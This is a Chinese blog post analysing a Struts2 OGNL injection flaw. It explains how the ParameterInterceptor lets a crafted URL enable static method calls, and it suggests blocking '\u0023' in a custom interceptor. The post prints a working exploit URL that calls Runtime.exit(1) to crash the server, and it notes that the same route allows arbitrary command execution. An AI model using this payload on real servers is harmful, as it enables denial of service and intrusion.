# Struts2漏洞分析 - z69183787的专栏 - CSDN博客
2014年09月03日 20:45:58[OkidoGreen](https://me.csdn.net/z69183787)阅读数：1935
个人分类：[Struts2																[安全专题](https://blog.csdn.net/z69183787/article/category/2357151)](https://blog.csdn.net/z69183787/article/category/2175433)
当在浏览器输入如下地址时：
       http://www.xxxx.com/aaa.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1 
输入以后，服务器端就会崩溃
原因如下：
1、 首先这个url翻译后?后面的内容如下：
?('#_memberAccess['allowStaticMethodAccess']')(meh)=true&(aaa)(('#context['xwork.MethodAccessor.denyMethodExecution']=#foo')(#foo=new%20java.lang.Boolean("false")))&(asdf)(('#rt.exit(1)')([#rt=@java.lang.Runtime@getRuntime()))=1](mailto:#rt=@java.lang.Runtime@getRuntime()))=1)
2、 当提交这个url后，经过了一个拦截器名为ParameterInterceptor
其中有这么一行源代码：
![](https://img-blog.csdn.net/20141205073746859)
   意思为：可以改变值栈中的值。例如
               在action中有一个属性name(该name有set方法)
        利用stack.setValue(“name”,”aaa”);就把name属性的值改为aaa字符串。
在上述的url中，有两个至关重要的值：
在map栈中：
     下图：
![](https://img-blog.csdn.net/20141205073810453)
_memberAccess是OgnlContext中的一个属性，这是一个权限类SecurityMemberAccess,该权限类中有一个方法allowStaticMethodAccess：是否允许访问静态方法。通过上面的url，把该属性的值设置为了true(默认值为false),
context['xwork.MethodAccessor.denyMethodExecution']则是
![](https://img-blog.csdn.net/20141205073846546)
只有这个值为false,Ognl表达式才能执行自定义的变量
在map栈中的其中一个值，这个是一个boolean值，设置为true,ognl表达式就能够调用静态的方法
(asdf)(('#rt.exit(1)')([#rt=@java.lang.Runtime@getRuntime()))=1](mailto:#rt=@java.lang.Runtime@getRuntime()))=1)则是一个shellcoade,ognl表达式可以执行静态方法，这样就可以调用java中的命令了。
当执行(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1这个代码的时候相当于java.lang.Runtime.getRuntime().exit(1);，这个时候整个程序关闭了，所以web容器也被关闭了。
为什么会存在这样的漏洞：
1、 struts2提供了存储数据的内存结构valueStack
2、 struts2也提供了访问数据的方式ognl表达式
3、 ognl表达式不但可以访问到valueStack中的值，而且还可以改变valueStack中的值
调用valueStack.setValue即可
4、 ognl表达式还能执行静态方法，并且嵌入一些shellcoade代码执行。
这样的结构很灵活，很方便程序员对数据进行操作，因为太灵活，所以在这里就存在安全性的隐患了。可以把一些特别的代码(导致系统崩溃)嵌入到ognl表达式中。
说明：
       上述url中的\u0023代表#号，%20代表空格，\u003代表等于
解决方案：
     做一个自定义的拦截器，拦截器过滤url,如果含有\u0023这个字符串，则不能执行以后的操作。这个拦截器的执行一定要在ParameterInterceptor执行之前
![](https://img-blog.csdn.net/20141205073937671)
在xml配置如下：
![](https://img-blog.csdn.net/20141205074018340)
